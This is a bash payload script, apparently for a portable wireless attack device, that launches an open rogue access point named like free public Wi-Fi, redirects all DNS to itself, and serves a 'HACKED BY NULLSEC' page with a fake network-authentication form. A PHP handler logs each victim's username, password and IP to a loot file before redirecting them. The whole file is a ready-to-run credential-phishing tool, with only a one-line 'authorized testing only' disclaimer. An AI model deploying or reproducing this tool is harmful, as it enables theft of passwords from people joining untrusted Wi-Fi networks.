#!/bin/bash
# Title: NullSec Deface Portal
# Author: bad-antics
# Description: Hacker-style deface page with credential capture
# Category: nullsec/social

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"

PROMPT "NULLSEC DEFACE PORTAL

Hacker-style deface page
with animated effects.

Shows 'HACKED BY NULLSEC'
then captures credentials.

Created by bad-antics

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

SSID=$(TEXT_PICKER "AP SSID:" "Free_Public_WiFi")
DURATION=$(NUMBER_PICKER "Duration (min):" 30)
DURATION_SEC=$((DURATION * 60))

CRED_LOG="$LOOT_DIR/deface_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "LAUNCH DEFACE PORTAL?

SSID: $SSID
Duration: ${DURATION} min

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq php 2>/dev/null

PORTAL_DIR="/tmp/deface_portal"
mkdir -p "$PORTAL_DIR"

# Create the epic deface page
cat > "$PORTAL_DIR/index.html" << 'DEFACEHTML'
<!DOCTYPE html>
<html>
<head>
<title>HACKED</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'Share Tech Mono', 'Courier New', monospace;
    background: #000;
    color: #0f0;
    min-height: 100vh;
    overflow-x: hidden;
}
.matrix-bg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    opacity: 0.1;
}
.container {
    max-width: 800px;
    margin: 0 auto;
    padding: 20px;
    text-align: center;
}
.skull {
    font-size: 80px;
    animation: pulse 1s infinite;
    text-shadow: 0 0 20px #0f0, 0 0 40px #0f0;
}
@keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.8; transform: scale(1.05); }
}
.glitch {
    font-size: 48px;
    font-weight: bold;
    text-transform: uppercase;
    position: relative;
    animation: glitch 0.5s infinite;
    text-shadow: 0 0 10px #0f0;
}
@keyframes glitch {
    0% { transform: translate(0); }
    20% { transform: translate(-2px, 2px); }
    40% { transform: translate(-2px, -2px); }
    60% { transform: translate(2px, 2px); }
    80% { transform: translate(2px, -2px); }
    100% { transform: translate(0); }
}
.glitch::before, .glitch::after {
    content: 'HACKED BY NULLSEC';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
}
.glitch::before {
    animation: glitchTop 1s infinite;
    clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
    -webkit-clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%);
}
.glitch::after {
    animation: glitchBottom 1.5s infinite;
    clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
    -webkit-clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%);
}
@keyframes glitchTop {
    0% { transform: translate(0); color: #0f0; }
    50% { transform: translate(-5px); color: #f00; }
    100% { transform: translate(0); color: #0f0; }
}
@keyframes glitchBottom {
    0% { transform: translate(0); color: #0f0; }
    50% { transform: translate(5px); color: #00f; }
    100% { transform: translate(0); color: #0f0; }
}
.hexagon {
    width: 100px;
    height: 115px;
    margin: 20px auto;
    position: relative;
}
.hexagon::before, .hexagon::after {
    content: "";
    position: absolute;
    width: 0;
    border-left: 50px solid transparent;
    border-right: 50px solid transparent;
}
.hexagon::before {
    bottom: 100%;
    border-bottom: 29px solid #c41e3a;
}
.hexagon::after {
    top: 100%;
    border-top: 29px solid #c41e3a;
}
.hex-inner {
    width: 100px;
    height: 57px;
    background: #c41e3a;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 40px;
    color: #000;
}
.message-box {
    background: rgba(0, 255, 0, 0.1);
    border: 1px solid #0f0;
    padding: 20px;
    margin: 20px 0;
    text-align: left;
    font-size: 14px;
    line-height: 1.6;
}
.typewriter {
    overflow: hidden;
    white-space: nowrap;
    animation: typing 3s steps(40);
}
@keyframes typing {
    from { width: 0; }
    to { width: 100%; }
}
.stats {
    display: flex;
    justify-content: space-around;
    margin: 30px 0;
    flex-wrap: wrap;
}
.stat-item {
    text-align: center;
    padding: 10px;
}
.stat-num {
    font-size: 36px;
    color: #c41e3a;
    text-shadow: 0 0 10px #c41e3a;
}
.stat-label {
    font-size: 12px;
    color: #666;
}
.login-box {
    background: rgba(0, 0, 0, 0.8);
    border: 2px solid #c41e3a;
    padding: 30px;
    margin-top: 30px;
    position: relative;
}
.login-box::before {
    content: "SYSTEM ACCESS";
    position: absolute;
    top: -12px;
    left: 20px;
    background: #000;
    padding: 0 10px;
    color: #c41e3a;
    font-size: 12px;
}
.login-box h3 {
    color: #c41e3a;
    margin-bottom: 20px;
}
input {
    width: 100%;
    padding: 12px;
    margin: 8px 0;
    background: #111;
    border: 1px solid #333;
    color: #0f0;
    font-family: inherit;
}
input:focus {
    outline: none;
    border-color: #0f0;
    box-shadow: 0 0 5px #0f0;
}
button {
    width: 100%;
    padding: 14px;
    background: linear-gradient(45deg, #c41e3a, #8b0000);
    border: none;
    color: white;
    font-family: inherit;
    font-size: 16px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 2px;
    margin-top: 15px;
    transition: all 0.3s;
}
button:hover {
    background: linear-gradient(45deg, #ff2d55, #c41e3a);
    box-shadow: 0 0 20px rgba(196, 30, 58, 0.5);
}
.credits {
    margin-top: 40px;
    padding: 20px;
    border-top: 1px solid #333;
    font-size: 12px;
    color: #666;
}
.credits a {
    color: #c41e3a;
    text-decoration: none;
}
.warning {
    color: #c41e3a;
    animation: blink 1s infinite;
}
@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}
.scan-line {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 2px;
    background: linear-gradient(90deg, transparent, #0f0, transparent);
    animation: scan 3s linear infinite;
    opacity: 0.5;
}
@keyframes scan {
    0% { top: 0; }
    100% { top: 100%; }
}
</style>
</head>
<body>
<div class="scan-line"></div>
<canvas class="matrix-bg" id="matrix"></canvas>

<div class="container">
    <div class="skull">💀</div>
    
    <h1 class="glitch">HACKED BY NULLSEC</h1>
    
    <div class="hexagon">
        <div class="hex-inner">⬡</div>
    </div>
    
    <div class="message-box">
        <p class="typewriter">> SYSTEM COMPROMISED</p>
        <p>> All network traffic is being monitored</p>
        <p>> Your security has been breached</p>
        <p>> Authenticate to restore access</p>
        <p class="warning">> WARNING: Unauthorized access detected</p>
    </div>
    
    <div class="stats">
        <div class="stat-item">
            <div class="stat-num" id="packets">0</div>
            <div class="stat-label">PACKETS CAPTURED</div>
        </div>
        <div class="stat-item">
            <div class="stat-num" id="devices">0</div>
            <div class="stat-label">DEVICES PWNED</div>
        </div>
        <div class="stat-item">
            <div class="stat-num" id="data">0</div>
            <div class="stat-label">MB INTERCEPTED</div>
        </div>
    </div>
    
    <div class="login-box">
        <h3>⚠️ NETWORK AUTHENTICATION REQUIRED</h3>
        <p style="font-size:12px;color:#666;margin-bottom:15px;">Enter credentials to restore network access</p>
        <form method="POST" action="/capture.php">
            <input type="text" name="username" placeholder="Username / Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="template" value="deface">
            <button type="submit">🔓 AUTHENTICATE</button>
        </form>
    </div>
    
    <div class="credits">
        <p>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
        <p>NULLSEC SECURITY RESEARCH</p>
        <p>Developed by <a href="#">bad-antics</a></p>
        <p>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</p>
        <p style="font-size:10px;margin-top:10px;">For educational and authorized testing only</p>
    </div>
</div>

<script>
// Matrix rain effect
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const chars = 'NULLSEC01アイウエオカキクケコサシスセソ';
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#0f0';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 33);

// Animate stats
function animateStats() {
    const packets = document.getElementById('packets');
    const devices = document.getElementById('devices');
    const data = document.getElementById('data');
    
    setInterval(() => {
        packets.textContent = Math.floor(Math.random() * 50000 + 10000);
        devices.textContent = Math.floor(Math.random() * 50 + 5);
        data.textContent = (Math.random() * 500 + 100).toFixed(1);
    }, 2000);
}
animateStats();
</script>
</body>
</html>
DEFACEHTML

# Capture script
cat > "$PORTAL_DIR/capture.php" << CAPPHP
<?php
\$log = "$CRED_LOG";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'] ?? '';
\$pass = \$_POST['password'] ?? '';
file_put_contents(\$log, "[\$ts] IP:\$ip USER:\$user PASS:\$pass\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPPHP

cat > "$PORTAL_DIR/success.html" << 'SUCCESSHTML'
<!DOCTYPE html>
<html>
<head><title>Access Restored</title>
<style>
body{font-family:'Courier New',monospace;background:#000;color:#0f0;text-align:center;padding:50px;}
.icon{font-size:80px;animation:pulse 1s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.5;}}
h1{color:#0f0;text-shadow:0 0 10px #0f0;}
</style>
</head>
<body>
<div class="icon">✓</div>
<h1>ACCESS RESTORED</h1>
<p>Network connection reestablished.</p>
<p>Redirecting to internet...</p>
<script>setTimeout(function(){window.location='http://www.msftconnecttest.com/redirect';},3000);</script>
</body>
</html>
SUCCESSHTML

LOG "Starting NullSec Deface Portal..."

cat > /tmp/deface_hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
wpa=0
EOF

hostapd /tmp/deface_hostapd.conf &
sleep 2
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

cat > /tmp/deface_dns.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.200,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/deface_dns.conf &

cd "$PORTAL_DIR" && php -S 10.0.0.1:80 &

LOG "Deface Portal active: $SSID"

sleep $DURATION_SEC

killall hostapd dnsmasq php 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "DEFACE PORTAL COMPLETE

SSID: $SSID
Duration: ${DURATION} min
Credentials: $CRED_COUNT

Created by bad-antics
Press OK to exit."
